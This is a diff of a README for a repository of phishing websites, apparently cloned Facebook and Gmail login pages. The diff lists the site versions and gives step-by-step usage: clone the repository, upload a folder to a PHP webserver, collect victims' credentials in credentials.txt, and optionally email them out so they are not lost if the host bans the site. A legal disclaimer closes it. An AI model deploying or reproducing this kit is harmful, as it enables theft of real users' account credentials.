@@ -1,18 +1,33 @@
 # Phishing Websites
 
-## Introduction
-Collection of popular phishing websites. 
+Collection of popular phishing websites.
 
-## Legal disclaimer
-Usage of this websites for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
+## List of websites
+
+- Facebook
+  - v. 2022-07-20 (en)
+  - v. 2019-06-01 (it)
+- Gmail
+  - v. 2019-06-01 (en)
 
 ## Usage
-1) Clone the repository.
-```
-git clone https://github.com/tassoneroberto/phishing-websites.git
-```
-2) Choose the website.
-3) Upload the entire content of the folder to a webserver (e.g. https://www.000webhost.com/).
-4) The system will store credentials in the file ```credentials.txt``` (you can rename it to prevent others to steal this file).
-5) Modify the field ```$maildrop``` inside the related PHP files to redirect the retrieved credentials to a selected email address. This is useful to prevent credentials loss if the host decide to ban the website.
-6) That's it! 
+
+1. Clone the repository
+
+    ```bash
+    git clone https://github.com/tassoneroberto/phishing-websites.git
+    ```
+
+2. Choose the website (e.g. `facebook/`)
+
+3. Upload the entire content of the selected folder to a PHP webserver
+
+4. The system will store the credentials in the file `credentials.txt`. You can rename it by editing the file `post.php`
+
+### Optional
+
+If you want to receive the credentials by email you have to uncomment this feature in `post.php`. This is useful to prevent to lose the collected credentials in case the web host decides to ban/delete the website
+
+## Legal disclaimer
+
+Usage of this websites for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
